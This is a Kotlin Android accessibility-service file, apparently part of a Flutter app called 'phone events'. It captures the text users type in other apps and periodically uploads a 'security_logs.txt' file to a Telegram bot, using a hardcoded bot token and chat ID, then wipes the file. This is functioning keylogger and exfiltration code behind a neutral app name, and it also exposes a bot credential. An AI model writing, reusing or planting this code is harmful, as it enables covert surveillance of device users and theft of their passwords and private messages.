package com.example.flutter_phone_events

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.os.Handler
import android.os.Looper
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.*
import kotlin.concurrent.thread

class MyAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    // private val logInterval = 3600000L // 1 hour
    private val logInterval = 300000L // 2 min

    companion object {
        var instance: MyAccessibilityService? = null
        var onEventCaptured: ((String) -> Unit)? = null
    }

    override fun onServiceConnected() {
        instance = this
        startPeriodicTask()
    }

    private fun startPeriodicTask() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                sendLogFileToTelegram()
                handler.postDelayed(this, logInterval)
            }
        }, logInterval)
    }

    private fun sendLogFileToTelegram() {
        val token = "8279084594:AAG6F4IX2Ahz1tc32cKaH3dkXNOubRSGLpg"
        val chatId = "8231933199"
        val logFile = File(filesDir, "security_logs.txt")

        if (logFile.exists() && logFile.length() > 0) {
            thread {
                try {
                    val boundary = "Boundary-${System.currentTimeMillis()}"
                    val url = URL("https://api.telegram.org/bot$token/sendDocument")
                    val conn = url.openConnection() as HttpURLConnection

                    conn.doOutput = true
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                    val outputStream = DataOutputStream(conn.outputStream)

                    // Add Chat ID field
                    outputStream.writeBytes("--$boundary\r\n")
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                    outputStream.writeBytes("$chatId\r\n")

                    // Add Document field
                    outputStream.writeBytes("--$boundary\r\n")
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"${logFile.name}\"\r\n")
                    outputStream.writeBytes("Content-Type: text/plain\r\n\r\n")

                    // Stream the file bytes
                    val fileInputStream = FileInputStream(logFile)
                    val buffer = ByteArray(4096)
                    var bytesRead: Int
                    while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
                        outputStream.write(buffer, 0, bytesRead)
                    }
                    fileInputStream.close()

                    outputStream.writeBytes("\r\n--$boundary--\r\n")
                    outputStream.flush()
                    outputStream.close()

                    if (conn.responseCode == 200) {
                        logFile.writeText("") // Wipe file after successful send
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val typedText = event.text.toString()
            onEventCaptured?.invoke(typedText)
        }
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        handler.removeCallbacksAndMessages(null)
        return super.onUnbind(intent)
    }

    override fun onInterrupt() {}
}